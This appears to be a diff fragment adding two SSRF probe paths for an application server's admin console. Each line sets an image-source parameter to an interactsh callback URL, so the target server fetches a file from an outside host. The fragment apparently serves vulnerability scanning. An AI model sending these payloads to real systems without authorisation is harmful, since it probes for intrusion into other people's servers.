@@ -1,0 +1,2 @@
+/admingui/version/Version?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
+/admingui/version/Masthead.jsp?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
